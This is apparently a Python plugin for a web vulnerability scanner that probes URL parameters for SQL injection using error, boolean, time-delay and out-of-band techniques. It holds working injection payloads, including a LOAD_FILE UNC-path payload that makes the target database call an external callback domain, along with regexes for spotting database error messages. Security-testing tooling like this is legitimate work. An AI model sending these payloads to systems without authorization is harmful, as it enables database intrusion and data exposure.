"""
modules/sqli_advanced.py — Advanced SQL Injection Plugin

This module implements a comprehensive SQL Injection testing strategy including:
- Error-based detection
- Boolean-based inference
- Time-based blind analysis
- OAST (Out-of-band) verification
"""
from __future__ import annotations
import re
import asyncio
import time
import uuid
from typing import List, Optional, Dict, Any, cast

from core.plugins import BasePlugin
from core.models import Finding, ScanResult, CVSS_PROFILES
from core.logger import logger

class SQLiAdvancedPlugin(BasePlugin):
    """
    Plugin for detecting SQL Injection vulnerabilities using multi-stage analysis.
    """
    NAME = "sqli"
    DESCRIPTION = "SQL Injection: Error, Boolean, Time and OAST-based techniques"
    OWASP_CATEGORY = "A03:2021 - Injection"
    TAGS = ["sqli", "injection", "database", "oast"]

    _ERROR_PATTERNS = [
        re.compile(p, re.IGNORECASE) for p in [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result", 
            r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", 
            r"valid PostgreSQL result", r"PostgreSQL QUERY ERROR", 
            r"Microsoft OLE DB Provider for SQL Server", r"SQLServer JDBC Driver", 
            r"System\.Data\.SqlClient\.SqlException", r"ORA-[0-9][0-9][0-9][0-9]", 
            r"Oracle error", r"Oracle.*driver", r"SQLite/JDBCDriver", 
            r"MariaDB server version"
        ]
    ]

    async def run(self, target: str, result: ScanResult) -> List[Finding]:
        """
        Executes the SQLi testing suite against discovered endpoints.

        Args:
            target: The base URL of the target.
            result: The scan result object to populate.

        Returns:
            List[Finding]: A list of discovered SQLi vulnerabilities.
        """
        logger.info(f"Running SQLi analysis on {len(result.discovered_endpoints)} endpoints")
        findings: List[Finding] = []
        endpoints = result.discovered_endpoints or [target]

        for url in endpoints:
            params = ["id", "user", "order", "sort", "search"]
            for param in params:
                f = await self.test_parameter(url, param)
                if f:
                    findings.append(f)
                    result.add_finding(f)

        return findings

    async def test_parameter(self, url: str, param: str) -> Optional[Finding]:
        """
        Tests a specific parameter for SQL Injection using multiple techniques.

        Args:
            url: The endpoint URL.
            param: The parameter name to test.

        Returns:
            Optional[Finding]: A Finding object if a vulnerability is confirmed.
        """
        # Phase 1: Error-based
        error_f = await self._test_error_based(url, param)
        if error_f: return error_f

        # Phase 2: Boolean-inference
        bool_f = await self._test_boolean_based(url, param)
        if bool_f: return bool_f

        # Phase 3: Blind/OAST
        blind_f = await self._test_blind_advanced(url, param)
        if blind_f: return blind_f

        return None

    async def _test_error_based(self, url: str, param: str) -> Optional[Finding]:
        """Detects SQLi by observing database error messages in responses."""
        payloads = ["'", "\"", "')--", "';--"]
        for p in payloads:
            res = await self.engine.get(f"{url}?{param}={p}")
            if res and any(pat.search(res.body) for pat in self._ERROR_PATTERNS):
                return Finding(
                    vuln_type="SQL Injection (Error-based)",
                    title=f"SQLi Error in '{param}'",
                    endpoint=url, parameter=param, payload=p,
                    severity="HIGH", owasp_category=self.OWASP_CATEGORY,
                    confidence_score=1.0, confirmed=True
                )
        return None

    async def _test_boolean_based(self, url: str, param: str) -> Optional[Finding]:
        """Detects SQLi by comparing response variations for True/False conditions."""
        res_true = await self.engine.get(f"{url}?{param}=1' AND '1'='1")
        res_false = await self.engine.get(f"{url}?{param}=1' AND '1'='2")
        
        if res_true and res_false and abs(len(res_true.body) - len(res_false.body)) > 100:
            f = Finding(
                vuln_type="SQL Injection (Boolean-based)",
                endpoint=url, parameter=param, severity="HIGH"
            )
            f.calculate_confidence({"boolean_based": True})
            return f
        return None

    async def _test_blind_advanced(self, url: str, param: str) -> Optional[Finding]:
        """Detects blind SQLi using Time-based probes and OAST verification."""
        evidence = {}
        
        # Time-based
        start = time.time()
        await self.engine.get(f"{url}?{param}=1'; WAITFOR DELAY '0:0:3'--")
        if (time.time() - start) >= 2.8:
            evidence["time_based"] = True

        # OAST
        if self.oast:
            domain = await self.oast.get_domain()
            marker = f"sqli-{uuid.uuid4().hex[:6]}"
            payload = f"1' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a WHERE 1=(SELECT LOAD_FILE(CONCAT('\\\\\\\\',{marker},'.',{domain},'\\\\a'))))--"
            await self.engine.get(f"{url}?{param}={payload}")
            if await self.oast.verify_interaction(marker):
                evidence["oast_callback"] = True

        if evidence:
            f = Finding(
                vuln_type="SQL Injection (Blind)",
                endpoint=url, parameter=param,
                severity="CRITICAL" if evidence.get("oast_callback") else "HIGH"
            )
            f.calculate_confidence(evidence)
            return f
        return None
